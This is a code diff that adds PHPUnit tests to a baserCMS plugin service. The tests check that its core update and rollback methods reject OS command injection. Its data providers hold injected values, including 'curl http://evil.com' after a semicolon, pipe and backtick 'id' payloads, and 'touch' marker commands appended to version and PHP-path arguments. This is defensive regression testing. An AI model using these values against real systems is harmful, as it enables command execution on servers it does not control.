@@ -12,11 +12,13 @@
 namespace BaserCore\Test\TestCase\Service;
 
 use BaserCore\Service\PluginsService;
+use BaserCore\Service\SiteConfigsServiceInterface;
 use BaserCore\Test\Factory\PluginFactory;
 use BaserCore\Test\Factory\SiteConfigFactory;
 use BaserCore\Test\Scenario\PluginsScenario;
 use BaserCore\TestSuite\BcTestCase;
 use BaserCore\Utility\BcComposer;
+use BaserCore\Utility\BcContainer;
 use BaserCore\Utility\BcZip;
 use BaserCore\Utility\BcFile;
 use BaserCore\Utility\BcFolder;
@@ -24,6 +26,7 @@ use BaserCore\Utility\BcUtil;
 use Cake\Cache\Cache;
 use Cake\Core\Configure;
 use Cake\Core\Plugin;
+use Cake\Log\Log;
 use Cake\Core\App;
 use CakephpFixtureFactories\Scenario\ScenarioAwareTrait;
 use Composer\Package\Archiver\ZipArchiver;
@@ -234,6 +237,9 @@ class PluginsServiceTest extends BcTestCase
         $this->Plugins->update('BcPluginSample', 'test');
         $this->assertEquals('10.0.0', $this->Plugins->getVersion('BcPluginSample'));
         rename($pluginPath . 'VERSION.bak.txt', $pluginPath . 'VERSION.txt');
+
+        $siteConfig = BcContainer::get()->get(SiteConfigsServiceInterface::class);
+        $siteConfig->setValue('version', '5.1.0');
 
         // コア
         rename(BASER . 'VERSION.txt', BASER . 'VERSION.bak.txt');
@@ -560,6 +566,48 @@ EOF;
     }
 
     /**
+     * test getCoreUpdate targetVersion バリデーション
+     * @dataProvider provideGetCoreUpdateInvalidTargetVersion
+     */
+    public function testGetCoreUpdateWithInvalidTargetVersion(string $targetVersion): void
+    {
+        $this->expectException("BaserCore\Error\BcException");
+        $this->Plugins->getCoreUpdate($targetVersion, 'php');
+    }
+
+    public static function provideGetCoreUpdateInvalidTargetVersion(): array
+    {
+        return [
+            'セミコロン付き' => ['5.2.2; curl http://evil.com'],
+            'パイプ付き' => ['5.2.2|id'],
+            'ワイルドカード' => ['5.2.x'],
+            '空文字' => [''],
+            '文字列のみ' => ['invalid'],
+        ];
+    }
+
+    /**
+     * test getCoreUpdate php バリデーション
+     * @dataProvider provideGetCoreUpdateInvalidPhp
+     */
+    public function testGetCoreUpdateWithInvalidPhp(string $php): void
+    {
+        $this->expectException("BaserCore\Error\BcException");
+        $this->Plugins->getCoreUpdate('5.2.2', $php);
+    }
+
+    public static function provideGetCoreUpdateInvalidPhp(): array
+    {
+        return [
+            'セミコロン付き' => ['curl http://evil.com;'],
+            'パイプ付き' => ['/usr/local/bin/php|id'],
+            'スペース付き' => ['/usr/local/bin/php -r "system(\'id\')"'],
+            'アンパサンド付き' => ['/usr/bin/php & curl evil.com'],
+            'バッククォート付き' => ['`id`'],
+        ];
+    }
+
+    /**
      * test getCoreUpdate
      * @return void
      */
@@ -706,5 +754,85 @@ EOF;
             //use_update_notice disabled
             [false, '5.0.0'],
         ];
+    }
+
+    /**
+     * test updateCore の脆弱性回避
+     */
+    public function test_updateCore_vulnerability()
+    {
+        // updateCoreFiles() は環境（vendorディレクトリなど）を破壊するため、モック化してスキップします
+        $pluginsService = $this->getMockBuilder(PluginsService::class)
+            ->onlyMethods(['updateCoreFiles'])
+            ->getMock();
+
+        $rceFile = TMP . 'rce_test';
+        $rceFilePhp = TMP . 'rce_test_php';
+        if (file_exists($rceFile)) unlink($rceFile);
+        if (file_exists($rceFilePhp)) unlink($rceFilePhp);
+
+        $maliciousConnection = 'default; touch ' . $rceFile;
+        $maliciousPhp = 'php; touch ' . $rceFilePhp;
+
+        Log::drop('update');
+        ob_start();
+        try {
+            $pluginsService->updateCore($maliciousPhp, $maliciousConnection);
+        } catch (\Throwable $e) {
+            // 例外が発生するのは正常（接続先が無効なため）
+        }
+        ob_get_clean();
+        // ログ設定の復元については、通常他のテストに影響しない（または setup テスト等で再設定される）ため
+        // このテスト内では Drop のみに留めるか、必要に応じて再設定を検討します。
+        // ※BaserCore のテストスイートでは BcTestCase がある程度面倒を見てくれます。
+
+        $this->assertFalse(file_exists($rceFile), 'OSコマンドインジェクション（connection）が実行されてしまいました');
+        $this->assertFalse(file_exists($rceFilePhp), 'OSコマンドインジェクション（php）が実行されてしまいました');
+    }
+
+    /**
+     * test rollbackCore の脆弱性回避
+     */
+    public function test_rollbackCore_vulnerability()
+    {
+        $rceFile = TMP . 'rce_test_rollback';
+        if (file_exists($rceFile)) unlink($rceFile);
+
+        $maliciousVersion = '1.0.0; touch ' . $rceFile;
+        $maliciousPhp = 'php; touch ' . $rceFile . '_php';
+
+        Log::drop('update');
+        ob_start();
+        try {
+            $this->Plugins->rollbackCore($maliciousVersion, $maliciousPhp);
+        } catch (\Throwable $e) {
+            // 失敗するのは正常
+        }
+        ob_get_clean();
+
+        $this->assertFalse(file_exists($rceFile), 'rollbackCore でOSコマンドインジェクションが発生しました');
+    }
+
+    /**
+     * test getCoreUpdate の脆弱性回避
+     */
+    public function test_getCoreUpdate_vulnerability()
+    {
+        $rceFile = TMP . 'rce_test_getCoreUpdate';
+        if (file_exists($rceFile)) unlink($rceFile);
+
+        $maliciousVersion = '5.0.0; touch ' . $rceFile;
+        $maliciousPhp = 'php; touch ' . $rceFile . '_php';
+
+        Log::drop('update');
+        ob_start();
+        try {
+            $this->Plugins->getCoreUpdate($maliciousVersion, $maliciousPhp);
+        } catch (\Throwable $e) {
+            // 失敗するのは正常
+        }
+        ob_get_clean();
+
+        $this->assertFalse(file_exists($rceFile), 'getCoreUpdate でOSコマンドインジェクションが発生しました');
     }
 }
